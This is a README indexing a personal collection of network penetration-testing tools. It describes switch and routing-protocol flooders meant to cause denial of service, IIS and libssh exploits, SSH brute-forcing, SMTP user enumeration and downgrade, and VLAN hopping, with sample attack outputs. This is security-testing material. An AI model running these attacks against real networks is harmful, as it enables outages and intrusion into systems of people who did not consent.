## Networks Penetration Testing related scripts, tools and Cheatsheets

- **`CDPFlooder.py`** - CDP Flooding tool, intended to take out entire segment switched by some old Cisco switches, vulnerable to Denial of Service after receiving big amount of invalid CDP packets.

The effect will be similar to:
```shell
SW2960#show cdp traffic 
CDP counters :
	Total packets output: 361, Input: 11824
	Hdr syntax: 0, Chksum error: 0, Encaps failed: 0
	No memory: 0, Invalid packet: 461858, Fragmented: 0
	CDP version 1 advertisements output: 9, Input: 178
	CDP version 2 advertisements output: 352, Input: 76
```

- **`dtpscan.py`** - DTP Scanner - simple script trying to determine type of configured switchport and DTP negotation mode in order to assist in VLAN Hopping attacks. ([gist](https://gist.github.com/mgeeky/3f678d385984ba0377299a844fb793fa))

- **`exchangeRecon.py`** - This tool connects to the given Exchange's hostname/IP address and then by collects various internal information being leaked while interacting with different Exchange protocols. Exchange may give away following helpful during OSINT or breach planning stages insights:
  - Internal IP address
  - Internal Domain Name (ActiveDirectory)
  - Exchange Server Version
  - support for various SMTP User Enumeration techniques
  - Version of underlying software such as ASP.NET, IIS which
      may point at OS version indirectly

This tool will be helpful before mounting social engieering attack against
victim's premises or to aid Password-Spraying efforts against exposed OWA 
interface. 

Sample run:
```powershell
PS D:\> python3 .\exchangeRecon.py 10.10.10.9

        :: Exchange Fingerprinter
        Tries to obtain internal IP address, Domain name and other clues by talking to Exchange
        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
        v0.2

[.] Probing for Exchange fingerprints...
[.] Triggering NTLM authentication...
[.] Probing support for legacy mail protocols and their capabilities...

======[ Leaked clues about internal environment ]======


Hostname: 10.10.10.9

*) SSL Certificate Subject components:
        CN = EXCH01

*) IIS Version:
        Microsoft-IIS/8.5

*) ASP.Net Version:
        4.0.30319

*) Outlook Web App version leaked in OWA HTML source:
        15.0.847
        (fuzzy match: Exchange Server 2013 SP1; February 25, 2014; 15.0.847.32)

*) Unusual HTTP headers observed:
        - X-SOAP-Enabled: True
        - X-WSSecurity-For: None
        - X-WSSecurity-Enabled: True
        - X-FEServer: EXCH01
        - X-OAuth-Enabled: True

*) Leaked Internal IP address:
        10.10.10.9

*) Leaked Internal Domain name in NTLM challenge packet:
        Target Name:
                BANK
        Context:

        Target:
                AD domain name    :     BANK
                Server name       :     EXCH01
                DNS domain name   :     bank.corp
                FQDN              :     EXCH01.bank.corp
                Parent DNS domain :     bank.corp
                Server Timestamp  :     19-11-20 Wed 01:35:18 UTC
        OS Ver:
                ????????
        Flags:
                - Negotiate Unicode
                - Request Target
                - Negotiate NTLM
                - Negotiate Always Sign
                - Target Type Domain
                - Negotiate NTLM2 Key
                - Negotiate Target Info
                - unknown
                - Negotiate 128
                - Negotiate 56

*) Exchange supports legacy SMTP and returned following banner/unusual capabilities:
        - X-ANONYMOUSTLS
        - 220 EXCH01.bank.corp Microsoft ESMTP MAIL Service ready at Wed, 20 Nov 2019 02:35:24 +0100
        - X-EXPS GSSAPI NTLM
        - EXCH01.bank.corp Hello [10.10.10.1]
        - XRDST

*) Results for SMTP User Enumeration attempts:
        - [+] VRFY root                                returned: (252, "2.1.5 Cannot VRFY user")
        - [-] EXPN root                                returned: (502, "5.3.3 Command not implemented")
        - [+] MAIL FROM:<test@bank.corp>               returned: (250, "2.1.0 Sender OK")
        - [+] RCPT TO:<test@bank.corp>                 returned: (250, "2.1.5 Recipient OK")
```

- **`host-scanner-via-udp.py`** - Running Hosts scanner leveraging ICMP Destination Unreachable response upon UDP closed port packet. Requires root/Administrator privileges. ([gist](https://gist.github.com/mgeeky/eae20db2d3dd4704fc6f04ea233bca9c))

- **`HSRPFlooder.py`** - Proof of concept _HSRP Coup State: Active_ flooder, trying to provoke Denial of Service within LAN segment due to tunnelling packets to the non-existent gateway that won active-router election. Not working stabily at the moment.

- **`IBM-MQ-Pentesting-notes.md`** - Busy-man's Practical IBM MQ Penetration Testing cheatsheet, equipped with a couple of handy tips and punch-q installation walkthrough. ([gist](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec))

- **`iis_webdav_upload.py`** - Microsoft IIS WebDAV Write Code Execution exploit (based on Metasploit HDM's <iis_webdav_upload_asp> implementation). ([gist](https://gist.github.com/mgeeky/ce179cdbe4d8d85979a28c1de61618c2))

- **`libssh-auth-bypass.py`** - CVE-2018-10993 libSSH authentication bypass exploit

- **`networkConfigurationCredentialsExtract.py`** - Network-configuration Credentials extraction script - intended to sweep input configuration file and extract keys, hashes, passwords. ([gist](https://gist.github.com/mgeeky/861a8769a261c7fc09a34b7d2bd1e1a0))

- **`nmap-christmas-tree.sh`** - Simple script looking for discrepancies between known-to-be listening TCP port and known-to-be closed one as seen from varying scan strategies.

- **`nmap-grep-to-table.sh`** - Script converting nmap's greppable output (-oG) into a printable per-host tables. ([gist](https://gist.github.com/mgeeky/cd3092cf60fd513d786286a21c6fa915))

- **`nmap-scan-all.sh`** - Simple script to launch nmap scans against given target, using specific options and scripts set.

- **`pingsweep.py`** - Quick Python Scapy-based ping-sweeper. ([gist](https://gist.github.com/mgeeky/a360e4a124ddb9ef6a9ac1557b47d14c))

- **`RoutingAttackKit.py`** - Tool collecting various Routing Protocols exploitation techniques in one place, one file, handy for Penetration Testing and Red-Teaming assignments. Currently supporting RIPv1/RIPv2 attacks, planning to cover OSPF, EIGRP, MPLS, IS-IS tricks someday.

TODO:
- Add more protocols and their related attacks and fuzzers
- Add online brute-force attacks against authentication strings
- Implement sniffer hunting for used protocols and their auth strings
- Implement semi-auto mode that is first learning a network, then choosing specific attacks

```bash
bash $ python RoutingAttackKit.py

        :: Routing Protocols Exploitation toolkit
        Sends out various routing protocols management frames 
        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
        v0.1

Available attacks:
	0. 'sniffer' - (NOT YET IMPLEMENTED) Sniffer hunting for authentication strings.
	1. 'ripv1-route' - RIP Spoofed Route announcement
	2. 'ripv1-dos' - RIPv1 Denial of Service by Null-routing
	3. 'ripv1-ampl' - RIPv1 Reflection Amplification DDoS
	4. 'ripv2-route' - RIPv2 Spoofed Route announcement
	5. 'ripv2-dos' - RIPv2 Denial of Service by Null-routing
	6. 'rip-fuzzer' - RIP/RIPv2 packets fuzzer

bash # python RoutingAttackKit.py -t rip-fuzzer -v

        :: Routing Protocols Exploitation toolkit
        Sends out various routing protocols management frames 
        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
        v0.1

[.] Using 192.168.1.14 as local/spoof IP address
[+] Launching attack: RIP/RIPv2 packets fuzzer
[.] Generating fuzzed packets for RIPv1...
[.] Generating fuzzed packets for RIPv2...
[.] Collected in total 47782 packets to send. Sending them out...
[+] Started flooding. Press CTRL-C to stop that.
^C

bash $ sudo tshark -i eth0 -f 'udp port 520'
Running as user "root" and group "root". This could be dangerous.
Capturing on 'eth0'
    1 0.000000000 192.168.1.14 → 224.0.0.9    RIP 60 Request[Malformed Packet]
    2 0.000006657 192.168.1.14 → 224.0.0.9    RIP 60 Request[Malformed Packet]
    3 0.015081856 192.168.1.14 → 224.0.0.9    RIPv2 69 Unknown command (254)[Malformed Packet]
    4 0.015089122 192.168.1.14 → 224.0.0.9    RIPv2 69 Unknown command (254)[Malformed Packet]
    5 0.017368720 192.168.1.14 → 224.0.0.9    RIP 70 Request[Malformed Packet]
    6 0.017372733 192.168.1.14 → 224.0.0.9    RIP 70 Request[Malformed Packet]
    7 0.021995733 192.168.1.14 → 224.0.0.9    RIPv2 70 Request[Malformed Packet]
    8 0.022003639 192.168.1.14 → 224.0.0.9    RIPv2 70 Request[Malformed Packet]
    9 0.043048787 192.168.1.14 → 224.0.0.9    RIP 60 Request[Malformed Packet]
   10 0.043058474 192.168.1.14 → 224.0.0.9    RIP 60 Request[Malformed Packet]
   11 0.050826081 192.168.1.14 → 224.0.0.9    RIPv2 61 Unknown command (64)[Malformed Packet]
   12 0.050831934 192.168.1.14 → 224.0.0.9    RIPv2 61 Unknown command (64)[Malformed Packet]
```

- **`smtpAudit.py`** - SMTP Server configuration black-box testing/audit tool, capable of auditing SPF/Accepted Domains, DKIM, DMARC, SSL/TLS, SMTP services, banner, Authentication (AUTH, X-EXPS), conducting user enumerations (VRFY, EXPN, RCPT TO) and others. ([gist](https://gist.github.com/mgeeky/ef49e5fb6c3479dd6a24eb90b53f9baa))
```
  Currently supported tests:
    01) 'spf'                           - SPF DNS record test
            - 'spf-version'             - Checks whether SPF record version is valid
            - 'all-mechanism-usage'     - Checks whether 'all' mechanism is used correctly
            - 'allowed-hosts-list'      - Checks whether there are not too many allowed hosts
    02) 'dkim'                          - DKIM DNS record test
            - 'public-key-length'       - Tests whether DKIM Public Key is at least 1024 bits long
    03) 'dmarc'                         - DMARC DNS record test
            - 'dmarc-version'           - Checks whether DMARC record version is valid
            - 'policy-rejects-by-default' - Checks whether DMARC uses reject policy
            - 'number-of-messages-filtered' - Checks whether there are at least 20% messages filtered.
    04) 'banner-contents'               - SMTP Banner sensitive informations leak test
            - 'not-contains-version'    - Contains version information
            - 'not-contains-prohibited-words'- Contains software/OS/or other prohibited name
            - 'is-not-long-or-complex'  - Seems to be long and/or complex
            - 'contains-hostname'       - Checks whether SMTP banner contains valid hostname
    05) 'open-relay'                    - Open-Relay misconfiguration test
            - 'internal-internal'
            - 'internal-external'
            - 'external-internal'
            - 'external-external'
            - And about 19 other variants
                                        - (the above is very effective against Postfix)
    06) 'vrfy'                          - VRFY user enumeration vulnerability test
    07) 'expn'                          - EXPN user enumeration vulnerability test
    08) 'rcpt-to'                       - RCPT TO user enumeration vulnerability test
    09) 'secure-ciphers'                - SSL/TLS ciphers security weak configuration
    10) 'starttls-offering'             - STARTTLS offering (opportunistic) weak configuration
    11) 'auth-over-ssl'                 - STARTTLS before AUTH/X-EXPS enforcement weak configuration
    12) 'auth-methods-offered'          - Test against unsecure AUTH/X-EXPS PLAIN/LOGIN methods.
    13) 'tls-key-len'                   - Checks private key length of negotiated or offered SSL/TLS cipher suites.
    14) 'spf-validation'                - Checks whether SMTP Server has been configured to validate sender's SPF 
                                          or if it's Microsoft Exchange - that is uses Accepted Domains
```

- **`sshbrute.py`** - ripped out from Violent Python - by TJ O'Connor. ([gist](https://gist.github.com/mgeeky/70606be7249a61ac26b34b1ef3b07553))

- **`smb-credential-leak.html`** - SMB Credentials leakage by MSEdge as presented in Browser Security White Paper, X41 D-Sec GmbH. ([gist](https://gist.github.com/mgeeky/44ce8a8887c169aa6a0093d915ea103d))

- **`smtpdowngrade.rb`** - Bettercap TCP Proxy SMTP Downgrade module - prevents the SMTP client from sending "STARTTLS" and returns "454 TLS Not available..." to the client. ([gist](https://gist.github.com/mgeeky/188f3f319e6f3536476e4b272ec0fb19))

- **`smtpvrfy.py`** - SMTP VRFY python tool intended to check whether SMTP server is leaking usernames. ([gist](https://gist.github.com/mgeeky/1df141b18082b6f424df98fa6a630435))

- **`wpa2-enterprise-utils`** - Couple of scripts that became needed/useful during **WPA2-Enterprise** penetration-testing assignment.

- **`VLANHopperDTP.py`** - VLAN Hopping via DTP Trunk (Switch) Spoofing exploit - script automating full VLAN Hopping attack, from DTP detection to VLAN Hop with DHCP lease request ([gist](https://gist.github.com/mgeeky/7ff9bb1dcf8aa093d3a157b3c22432a0))

    Sample output:

```bash
$ ./VLANHopperDTP.py --help

        :: VLAN Hopping via DTP Trunk negotiation 
        Performs VLAN Hopping via negotiated DTP Trunk / Switch Spoofing technique
        Mariusz Banach / mgeeky, '18
        v0.3

usage: ./VLANHopperDTP.py [options]

optional arguments:
  -h, --help            show this help message and exit
  -i DEV, --interface DEV
                        Select interface on which to operate.
  -e CMD, --execute CMD
                        Launch specified command after hopping to new VLAN.
                        One can use one of following placeholders in command:
                        %IFACE (choosen interface), %IP (acquired IP), %NET
                        (net address), %HWADDR (MAC), %GW (gateway), %MASK
                        (full mask), %CIDR (short mask). For instance: -e
                        "arp-scan -I %IFACE %NET%CIDR". May be repeated for
                        more commands. The command will be launched
                        SYNCHRONOUSLY, meaning - one have to append "&" at the
                        end to make the script go along.
  -E CMD, --exit-execute CMD
                        Launch specified command at the end of this script
                        (during cleanup phase).
  -m HWADDR, --mac-address HWADDR
                        Changes MAC address of the interface before and after
                        attack.
  -f, --force           Attempt VLAN Hopping even if DTP was not detected
                        (like in Nonegotiate situation).
  -a, --analyse         Analyse mode: do not create subinterfaces, don't ask
                        for DHCP leases.
  -v, --verbose         Display verbose output.
  -d, --debug           Display debug output.



$ sudo ./VLANHopperDTP.py -i enp5s0f1

        :: VLAN Hopping via DTP Trunk negotiation 
        Performs VLAN Hopping via negotiated DTP Trunk / Switch Spoofing technique
        Mariusz Banach / mgeeky, '18
        v0.2

[+] VLAN Hopping IS possible.
[>] After Hopping to other VLANs - leave this program running to maintain connections.
[>] Discovering new VLANs...
==> VLAN discovered: 10
==> VLAN discovered: 20
==> VLAN discovered: 30
==> VLAN discovered: 99
[+] Hopped to VLAN 10.: 172.16.10.10
[+] Hopped to VLAN 20.: 172.16.20.10
[+] Hopped to VLAN 30.: 172.16.30.11
[+] Hopped to VLAN 99.: 172.16.99.10
```
